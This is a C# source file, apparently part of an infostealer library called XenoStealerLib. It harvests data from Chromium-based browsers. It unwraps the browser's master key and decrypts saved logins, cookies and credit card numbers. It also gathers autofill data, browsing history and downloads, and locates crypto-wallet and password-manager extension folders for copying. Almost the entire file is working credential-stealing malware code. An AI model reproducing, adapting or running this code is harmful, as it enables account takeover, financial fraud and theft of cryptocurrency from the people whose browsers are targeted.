using XenoStealerLib.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.Xml;
using System.Text;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace XenoStealerLib
{
    public class Chromium// make an aggresive mode that will kill the browser
    {
        private bool Aggresive = false;


        private string[] profiles = {
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
            "Profile 6",
            "Profile 7",
            "Profile 8",
            "Profile 9",
            ""
        };


        public Chromium(bool Aggresive=false) 
        {
            this.Aggresive = Aggresive;
        }

        private static byte[] GetMasterKey(string path)
        {
            if (!File.Exists(path))
                return null;

            string content = File.ReadAllText(path);
            if (!content.Contains("os_crypt"))
                return null;

            JavaScriptSerializer serializer = new JavaScriptSerializer();
            dynamic jsonObject = serializer.Deserialize<dynamic>(content);
            if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
            {
                string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);

                byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));

                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
            }
            return null;
        }

        private string DecryptPassword(byte[] buffer, byte[] masterKey)
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
            try
            {
                Array.Copy(buffer, 3, iv, 0, 12);
                byte[] Buffer = new byte[buffer.Length - 15];
                Array.Copy(buffer, 15, Buffer, 0, buffer.Length - 15);

                byte[] tag = new byte[16];
                byte[] data = new byte[Buffer.Length - tag.Length]; 
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);
                string result = Encoding.UTF8.GetString(AesGcm.Decrypt(masterKey, iv, null, data, tag));
                return result;
            }
            catch (Exception)
            {
                //Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public ChromiumDataEx GetAll()
        {
            List<AutoFillHolder> autoFillList = new List<AutoFillHolder>();
            List<LoginHolder> loginList = new List<LoginHolder>();
            List<CookieHolder> cookieList = new List<CookieHolder>();
            List<CreditCardHolder> creditCardsList = new List<CreditCardHolder>();
            List<CryptoExtensionHolder> cryptoExtensionsList = new List<CryptoExtensionHolder>();
            List<PasswordExtensionHolder> passwordExtensionsList = new List<PasswordExtensionHolder>();
            List<WebHistoryHolder> webHistoryList = new List<WebHistoryHolder>();
            List<DownloadHolder> downloadsList = new List<DownloadHolder>();
            foreach (KeyValuePair<string, string> browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (string profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;

                    List<Login> loginData = null;
                    List<Cookie> cookieData = null;
                    List<AutoFill> autofillData = null;
                    List<CreditCard> creditCardsData = null;
                    List<CryptoExtension> cryptoExtentionData = null;
                    List<PasswordExtension> passwordExtentionData = null;
                    List<WebHistory> webHistoryData = null;
                    List<Download> downloadsData = null;

                    try
                    {
                        loginData = GetLoginData(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        cookieData = GetCookies(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        autofillData = GetAutoFill(profilePath);
                    }
                    catch
                    {
                    }

                    try
                    {
                        creditCardsData = GetCreditCards(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        cryptoExtentionData = GetCryptoExtensions(profilePath, browser.Key);
                    }
                    catch
                    {
                    }

                    try
                    {
                        passwordExtentionData = GetPasswordExtensions(profilePath, browser.Key);
                    }
                    catch
                    {
                    }

                    try
                    {
                        webHistoryData = GetWebHistory(profilePath);
                    }
                    catch
                    {
                    }

                    try
                    {
                        downloadsData = GetDownloads(profilePath);
                    }
                    catch
                    {
                    }


                    if (creditCardsData != null && creditCardsData.Count != 0) creditCardsList.Add(new CreditCardHolder(creditCardsData.ToArray(), browser.Key, profile));
                    if (autofillData != null && autofillData.Count != 0) autoFillList.Add(new AutoFillHolder(autofillData.ToArray(), browser.Key, profile));
                    if (loginData != null && loginData.Count != 0) loginList.Add(new LoginHolder(loginData.ToArray(), browser.Key, profile));
                    if (cookieData != null && cookieData.Count != 0) cookieList.Add(new CookieHolder(cookieData.ToArray(), browser.Key, profile));
                    if (cryptoExtentionData != null && cryptoExtentionData.Count != 0) cryptoExtensionsList.Add(new CryptoExtensionHolder(cryptoExtentionData.ToArray(), browser.Key, profile));
                    if (passwordExtentionData != null && passwordExtentionData.Count != 0) passwordExtensionsList.Add(new PasswordExtensionHolder(passwordExtentionData.ToArray(), browser.Key, profile));
                    if (webHistoryData != null && webHistoryData.Count != 0) webHistoryList.Add(new WebHistoryHolder(webHistoryData.ToArray(), browser.Key, profile));
                    if (downloadsData != null && downloadsData.Count != 0) downloadsList.Add(new DownloadHolder(downloadsData.ToArray(), browser.Key, profile));
                }
            }
            return new ChromiumDataEx(autoFillList.ToArray(), loginList.ToArray(), cookieList.ToArray(), creditCardsList.ToArray(), cryptoExtensionsList.ToArray(), passwordExtensionsList.ToArray(), webHistoryList.ToArray(), downloadsList.ToArray());
        }


        public ChromiumData GetImportant() 
        {
            List<AutoFillHolder> autoFillList = new List<AutoFillHolder>();
            List<LoginHolder> loginList = new List<LoginHolder>();
            List<CookieHolder> cookieList = new List<CookieHolder>();
            List<CreditCardHolder> creditCardsList = new List<CreditCardHolder>();
            List<CryptoExtensionHolder> cryptoExtensionsList = new List<CryptoExtensionHolder>();
            List<PasswordExtensionHolder> passwordExtensionsList = new List<PasswordExtensionHolder>();
            foreach (KeyValuePair<string, string> browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (string profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;

                    List<Login> loginData = null;
                    List<Cookie> cookieData = null;
                    List<AutoFill> autofillData = null;
                    List<CreditCard> creditCardsData = null;
                    List<CryptoExtension> cryptoExtentionData = null;
                    List<PasswordExtension> passwordExtentionData = null;

                    try
                    {
                        loginData = GetLoginData(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        cookieData = GetCookies(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        autofillData = GetAutoFill(profilePath);
                    }
                    catch
                    {
                    }

                    try
                    {
                        creditCardsData = GetCreditCards(profilePath, masterKey);
                    }
                    catch
                    {
                    }

                    try
                    {
                        cryptoExtentionData = GetCryptoExtensions(profilePath, browser.Key);
                    }
                    catch
                    {
                    }

                    try
                    {
                        passwordExtentionData = GetPasswordExtensions(profilePath, browser.Key);
                    }
                    catch
                    {
                    }


                    if (creditCardsData != null && creditCardsData.Count != 0) creditCardsList.Add(new CreditCardHolder(creditCardsData.ToArray(), browser.Key, profile));
                    if (autofillData != null && autofillData.Count != 0) autoFillList.Add(new AutoFillHolder(autofillData.ToArray(), browser.Key, profile));
                    if (loginData != null && loginData.Count != 0) loginList.Add(new LoginHolder(loginData.ToArray(), browser.Key, profile));
                    if (cookieData != null && cookieData.Count != 0) cookieList.Add(new CookieHolder(cookieData.ToArray(), browser.Key, profile));
                    if (cryptoExtentionData != null && cryptoExtentionData.Count!=0) cryptoExtensionsList.Add(new CryptoExtensionHolder(cryptoExtentionData.ToArray(), browser.Key, profile));
                    if (passwordExtentionData != null && passwordExtentionData.Count != 0) passwordExtensionsList.Add(new PasswordExtensionHolder(passwordExtentionData.ToArray(), browser.Key, profile));
                }
            }
            return new ChromiumData(autoFillList.ToArray(), loginList.ToArray(), cookieList.ToArray(), creditCardsList.ToArray(), cryptoExtensionsList.ToArray(), passwordExtensionsList.ToArray());
        }

        public List<CryptoExtension> GetCryptoExtensions(string profilePath, string browserName) 
        {
            List<CryptoExtension> extensions = new List<CryptoExtension>();
            string ExtensionPath = Path.Combine(profilePath, "Local Extension Settings");
            if (!Directory.Exists(ExtensionPath))
                return null;

            if (browserName.ToLower().Contains("microsoft"))
            {
                foreach (var extensionData in Internal_Settings.EdgeCryptoExtensions)
                {
                    string extPath = Path.Combine(ExtensionPath, extensionData.Value);
                    if (Directory.Exists(extPath))
                    {
                        extensions.Add(new CryptoExtension(extensionData.Key, extPath));
                    }
                }
            }
            else
            {
                foreach (var extensionData in Internal_Settings.ChromiumCryptoExtensions)
                {
                    string extPath = Path.Combine(ExtensionPath, extensionData.Value);
                    if (Directory.Exists(Path.Combine(ExtensionPath, extPath)))
                    {
                        extensions.Add(new CryptoExtension(extensionData.Key, extPath));
                    }
                }
            }

            return extensions;
        }

        public List<PasswordExtension> GetPasswordExtensions(string profilePath, string browserName)
        {
            List<PasswordExtension> extensions = new List<PasswordExtension>();
            string ExtensionPath = Path.Combine(profilePath, "Local Extension Settings");
            if (!Directory.Exists(ExtensionPath))
                return null;

            if (browserName.ToLower().Contains("microsoft"))
            {
                foreach (var extensionData in Internal_Settings.EdgePasswordManagerExtensions)
                {
                    string extPath = Path.Combine(ExtensionPath, extensionData.Value);
                    if (Directory.Exists(extPath))
                    {
                        extensions.Add(new PasswordExtension(extensionData.Key, extPath));
                    }
                }
            }
            else
            {
                foreach (var extensionData in Internal_Settings.ChromePasswordManagerExtensions)
                {
                    string extPath = Path.Combine(ExtensionPath, extensionData.Value);
                    if (Directory.Exists(Path.Combine(ExtensionPath, extPath)))
                    {
                        extensions.Add(new PasswordExtension(extensionData.Key, extPath));
                    }
                }
            }

            return extensions;
        }

        public List<PasswordExtensionHolder> GetPasswordExtensions() //gets files that need to be copied
        {
            List<PasswordExtensionHolder> extensionsList = new List<PasswordExtensionHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;
                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    List<PasswordExtension> extensions = GetPasswordExtensions(profilePath, browser.Key);
                    if (extensions != null && extensions.Count != 0)
                    {
                        extensionsList.Add(new PasswordExtensionHolder(extensions.ToArray(), browser.Key, profile));
                    }
                }
            }
            return extensionsList;
        }

        public List<CryptoExtensionHolder> GetCryptoExtensions() //gets files that need to be copied
        {
            List<CryptoExtensionHolder> extensionsList = new List<CryptoExtensionHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;
                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    List<CryptoExtension> extensions = GetCryptoExtensions(profilePath, browser.Key);
                    if (extensions!=null && extensions.Count != 0) 
                    {
                        extensionsList.Add(new CryptoExtensionHolder(extensions.ToArray(), browser.Key, profile));
                    }
                }
            }
            return extensionsList;
        }

        public List<LoginHolder> GetLogins()
        {
            List<LoginHolder> loginList = new List<LoginHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        
                        List<Login> loginData = GetLoginData(profilePath, masterKey);
                        if (loginData == null) continue;
                        loginList.Add(new LoginHolder(loginData.ToArray(), browser.Key, profile));
                    }
                    catch
                    {
                    }
                }
            }
            return loginList;
        }
        public List<CookieHolder> GetCookies()
        {
            List<CookieHolder> cookieList = new List<CookieHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Cookie> cookieData = GetCookies(profilePath, masterKey);
                        if (cookieData == null) continue;
                        cookieList.Add(new CookieHolder(cookieData.ToArray(), browser.Key, profile));
                    }
                    catch
                    {
                    }
                }
            }
            return cookieList;
        }
        public List<WebHistoryHolder> GetWebHistory()
        {
            List<WebHistoryHolder> webHistoryList = new List<WebHistoryHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<WebHistory> webHistoryData = GetWebHistory(profilePath);
                        if (webHistoryData == null) continue;
                        webHistoryList.Add(new WebHistoryHolder(webHistoryData.ToArray(), browser.Key, profile));
                    }
                    catch { }
                }
            }
            return webHistoryList;
        }
        public List<DownloadHolder> GetDownloads()
        {
            List<DownloadHolder> downloadsList = new List<DownloadHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<Download> downloadsData = GetDownloads(profilePath);
                        if (downloadsData == null) continue;
                        downloadsList.Add(new DownloadHolder(downloadsData.ToArray(), browser.Key, profile));
                    }
                    catch { }
                }
            }
            return downloadsList;
        }
        public List<CreditCardHolder> GetCreditCards()
        {
            List<CreditCardHolder> creditCardsList = new List<CreditCardHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                byte[] masterKey = GetMasterKey($"{path}\\Local State");
                if (masterKey == null)
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<CreditCard> creditCardsData = GetCreditCards(profilePath, masterKey);
                        if (creditCardsData == null) continue;
                        creditCardsList.Add(new CreditCardHolder(creditCardsData.ToArray(), browser.Key, profile));
                    }
                    catch { }
                }
            }
            return creditCardsList;
        }

        public List<AutoFillHolder> GetAutofills()
        {
            List<AutoFillHolder> autoFillList = new List<AutoFillHolder>();
            foreach (var browser in Internal_Settings.ChromiumBrowsers)
            {
                string path = browser.Value;
                if (!Directory.Exists(path))
                    continue;

                foreach (var profile in profiles)
                {
                    string profilePath = Path.Combine(path, profile);
                    if (!Directory.Exists(profilePath))
                        continue;
                    try
                    {
                        List<AutoFill> autofillData = GetAutoFill(profilePath);
                        if (autofillData == null) continue;
                        autoFillList.Add(new AutoFillHolder(autofillData.ToArray(), browser.Key, profile));
                    }
                    catch { }
                }
            }
            return autoFillList;
        }

        private List<Login> GetLoginData(string path, byte[] masterKey)
        {
            string loginDbPath = Path.Combine(path, "Login Data");
            if (!File.Exists(loginDbPath))
                return null;

            List<Login> logins = new List<Login>();

            try
            {
                SqlHandler conn = new SqlHandler(loginDbPath, Aggresive);

                if (!conn.ReadTable("logins"))
                {
                    logins = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string password = conn.GetValue(i, "password_value");
                    string username = conn.GetValue(i, "username_value");
                    string url = conn.GetValue(i, "action_url");
                    if (url == "") 
                    {
                        try
                        {
                            url = conn.GetValue(i, "origin_url");
                        }
                        catch { }
                    }
                    if (password == null || username == null || url == null) continue;

                    password = DecryptPassword(Encoding.Default.GetBytes(password), masterKey);
                    if (password == "" && username == "")
                    {
                        continue;
                    }
                    logins.Add(new Login(url, username, password));
                }
            }
            catch
            {
                logins = null;
            }


            return logins;
        }


        private List<Cookie> GetCookies(string path, byte[] masterKey)
        {
            string cookieDbPath = Path.Combine(path, "Network", "Cookies");
            if (!File.Exists(cookieDbPath))
                return null;
            List<Cookie> cookies = new List<Cookie>();
            try
            {
                SqlHandler conn = new SqlHandler(cookieDbPath, Aggresive);

                if (!conn.ReadTable("cookies"))
                {
                    cookies = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string host = conn.GetValue(i, "host_key");
                    string name = conn.GetValue(i, "name");
                    string url_path = conn.GetValue(i, "path");
                    string decryptedCookie = conn.GetValue(i, "encrypted_value");
                    string expires_string = conn.GetValue(i, "expires_utc");

                    if (host == null || name == null || url_path == null || decryptedCookie == null || expires_string == null || expires_string == "") continue;

                    long expires_utc = long.Parse(expires_string);
                    decryptedCookie = DecryptPassword(Encoding.Default.GetBytes(decryptedCookie), masterKey);
                    if (decryptedCookie == "" || decryptedCookie == null)
                    {
                        continue;
                    }
                    cookies.Add(new Cookie(
                        host,
                        name,
                        url_path,
                        decryptedCookie,
                        expires_utc
                    ));
                }
            }
            catch (Exception)
            {
                cookies = null;
            }
            return cookies;
        }

        private List<WebHistory> GetWebHistory(string path)
        {
            string historyDbPath = Path.Combine(path, "History");
            if (!File.Exists(historyDbPath))
                return null;

            List<WebHistory> history = new List<WebHistory>();
            try
            {
                SqlHandler conn = new SqlHandler(historyDbPath, Aggresive);

                if (!conn.ReadTable("urls"))
                {
                    history = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string url = conn.GetValue(i, "url");
                    string title = conn.GetValue(i, "title");
                    string last_visit_time_string = conn.GetValue(i, "last_visit_time");
                    if (url == "" || url == null || title == null || last_visit_time_string == null || last_visit_time_string == "")
                    {
                        continue;
                    }
                    long last_visit_time = long.Parse(last_visit_time_string);
                    history.Add(new WebHistory(
                        url,
                        title,
                        last_visit_time
                    ));
                }
            }
            catch (Exception)
            {
                history = null;
            }
            return history;
        }

        private List<Download> GetDownloads(string path)
        {
            string downloadsDbPath = Path.Combine(path, "History");
            if (!File.Exists(downloadsDbPath))
                return null;

            List<Download> downloads = new List<Download>();

            try
            {
                SqlHandler conn = new SqlHandler(downloadsDbPath, Aggresive);

                if (!conn.ReadTable("downloads"))
                {
                    downloads = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {

                    string target_path = conn.GetValue(i, "target_path");
                    string tab_url = conn.GetValue(i, "tab_url");
                    if (target_path == null || target_path == "" || tab_url == null)
                    {
                        continue;
                    }
                    downloads.Add(new Download(
                        tab_url,
                        target_path
                    ));
                }
            }
            catch (Exception)
            {
                downloads = null;
            }
            return downloads;
        }

        private List<CreditCard> GetCreditCards(string path, byte[] masterKey)
        {
            string cardsDbPath = Path.Combine(path, "Web Data");
            if (!File.Exists(cardsDbPath))
                return null;
            List<CreditCard> cards = new List<CreditCard>();
            try
            {
                SqlHandler conn = new SqlHandler(cardsDbPath, Aggresive);

                if (!conn.ReadTable("credit_cards"))
                {
                    cards = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string name_on_card = conn.GetValue(i, "name_on_card");
                    string expiration_month = conn.GetValue(i, "expiration_month");
                    string expiration_year = conn.GetValue(i, "expiration_year");
                    string cardNumber = conn.GetValue(i, "card_number_encrypted");
                    string date_modified_string = conn.GetValue(i, "date_modified");
                    if (name_on_card == null || expiration_month == null || expiration_year == null || cardNumber == null || cardNumber == "" || date_modified_string == null) continue;

                    cardNumber = DecryptPassword(Encoding.Default.GetBytes(cardNumber), masterKey);
                    long date_modified = long.Parse(date_modified_string);
                    cards.Add(new CreditCard(
                        name_on_card,
                        expiration_month,
                        expiration_year,
                        cardNumber,
                        date_modified
                    ));
                }
            }
            catch (Exception)
            {
                cards = null;
            }
            return cards;
        }

        private List<AutoFill> GetAutoFill(string path)
        {
            string WebdataDbPath = Path.Combine(path, "Web Data");
            if (!File.Exists(WebdataDbPath))
                return null;
            List<AutoFill> autofills = new List<AutoFill>();
            try
            {
                SqlHandler conn = new SqlHandler(WebdataDbPath, Aggresive);

                if (!conn.ReadTable("autofill"))
                {
                    autofills = null;
                    return null;
                }

                for (int i = 0; i < conn.GetRowCount(); i++)
                {
                    string name = conn.GetValue(i, "name");
                    string value = conn.GetValue(i, "value");
                    if (name == null || value == null) continue;

                    autofills.Add(new AutoFill(
                        name,
                        value
                    ));
                }
            }
            catch (Exception)
            {
                autofills = null;
            }

            return autofills;
        }
        public class ChromiumData 
        {
            public AutoFillHolder[] AutoFills;
            public LoginHolder[] Logins;
            public CookieHolder[] Cookies;
            public CreditCardHolder[] CreditCards;
            public CryptoExtensionHolder[] CryptoExtensions;
            public PasswordExtensionHolder[] PasswordExtensions;
            public ChromiumData(AutoFillHolder[] AutoFills, LoginHolder[] Logins, CookieHolder[] Cookies, CreditCardHolder[] CreditCards, CryptoExtensionHolder[] CryptoExtensions, PasswordExtensionHolder[] PasswordExtensions) 
            {
                this.AutoFills = AutoFills;
                this.Logins = Logins;
                this.Cookies = Cookies;
                this.CreditCards = CreditCards;
                this.CryptoExtensions = CryptoExtensions;
                this.PasswordExtensions = PasswordExtensions;
            }
        }

        public class ChromiumDataEx
        {
            public AutoFillHolder[] AutoFills;
            public LoginHolder[] Logins;
            public CookieHolder[] Cookies;
            public CreditCardHolder[] CreditCards;
            public CryptoExtensionHolder[] CryptoExtensions;
            public PasswordExtensionHolder[] PasswordExtensions;
            public WebHistoryHolder[] WebHistorys;
            public DownloadHolder[] WebDownloads;
            public ChromiumDataEx(AutoFillHolder[] AutoFills, LoginHolder[] Logins, CookieHolder[] Cookies, CreditCardHolder[] CreditCards, CryptoExtensionHolder[] CryptoExtensions, PasswordExtensionHolder[] PasswordExtensions, WebHistoryHolder[] WebHistorys, DownloadHolder[] WebDownloads)
            {
                this.AutoFills = AutoFills;
                this.Logins = Logins;
                this.Cookies = Cookies;
                this.CreditCards = CreditCards;
                this.CryptoExtensions = CryptoExtensions;
                this.PasswordExtensions = PasswordExtensions;
                this.WebHistorys = WebHistorys;
                this.WebDownloads = WebDownloads;
            }
        }

        public class CryptoExtensionHolder
        {
            public CryptoExtension[] extensions;
            public string browser;
            public string profile;
            public CryptoExtensionHolder(CryptoExtension[] extensions, string browser, string profile)
            {
                this.extensions = extensions;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class CryptoExtension 
        {
            public string name;
            public string path;
            public CryptoExtension(string name, string path) 
            {
                this.name = name;
                this.path = path;
            }
        }

        public class PasswordExtensionHolder
        {
            public PasswordExtension[] extensions;
            public string browser;
            public string profile;
            public PasswordExtensionHolder(PasswordExtension[] extensions, string browser, string profile)
            {
                this.extensions = extensions;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class PasswordExtension
        {
            public string name;
            public string path;
            public PasswordExtension(string name, string path)
            {
                this.name = name;
                this.path = path;
            }
        }

        public class AutoFillHolder
        {
            public AutoFill[] autofills;
            public string browser;
            public string profile;
            public AutoFillHolder(AutoFill[] autofills, string browser, string profile)
            {
                this.autofills = autofills;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class AutoFill
        {
            public AutoFill(string name, string value)
            {
                this.name = name;
                this.value = value;
            }

            public string name { get; set; }
            public string value { get; set; }
        }

        public class LoginHolder 
        {
            public Login[] logins;
            public string browser;
            public string profile;
            public LoginHolder(Login[] logins, string browser, string profile) 
            {
                this.logins = logins;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class Login
        {
            public Login(string url, string username, string password)
            {
                this.url = url;
                this.username = username;
                this.password = password;
            }

            public string url { get; set; }
            public string username { get; set; }
            public string password { get; set; }
        }

        public class CookieHolder
        {
            public Cookie[] cookies;
            public string browser;
            public string profile;
            public CookieHolder(Cookie[] cookies, string browser, string profile)
            {
                this.cookies = cookies;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class Cookie
        {
            public Cookie(string host, string name, string path, string value, long expires)
            {
                this.host = host;
                this.name = name;
                this.path = path;
                this.value = value;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (expires / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp - 1;
                }
                this.expires = unixExpires;
            }

            public string host { get; set; }
            public string name { get; set; }
            public string path { get; set; }
            public string value { get; set; }
            public long expires { get; set; }
        }

        public class WebHistoryHolder
        {
            public WebHistory[] webHistory;
            public string browser;
            public string profile;
            public WebHistoryHolder(WebHistory[] webHistory, string browser, string profile)
            {
                this.webHistory = webHistory;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class WebHistory
        {
            public WebHistory(string url, string title, long timestamp)
            {
                this.url = url;
                this.title = title;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (timestamp / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp - 1;
                }
                this.timestamp = unixExpires;
            }

            public string url { get; set; }
            public string title { get; set; }
            public long timestamp { get; set; }
        }

        public class DownloadHolder
        {
            public Download[] downloads;
            public string browser;
            public string profile;
            public DownloadHolder(Download[] downloads, string browser, string profile)
            {
                this.downloads = downloads;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class Download
        {
            public Download(string tab_url, string target_path)
            {
                this.tab_url = tab_url;
                this.target_path = target_path;
            }

            public string tab_url { get; set; }
            public string target_path { get; set; }
        }

        public class CreditCardHolder
        {
            public CreditCard[] creditCards;
            public string browser;
            public string profile;
            public CreditCardHolder(CreditCard[] creditCards, string browser, string profile)
            {
                this.creditCards = creditCards;
                this.browser = browser;
                this.profile = profile;
            }
        }

        public class CreditCard
        {
            public CreditCard(string name, string month, string year, string number, long date_modified)
            {
                this.name = name;
                this.month = month;
                this.year = year;
                this.number = number;
                this.date_modified = date_modified;
            }

            public string name { get; set; }
            public string month { get; set; }
            public string year { get; set; }
            public string number { get; set; }
            public long date_modified { get; set; }
        }
    }
}
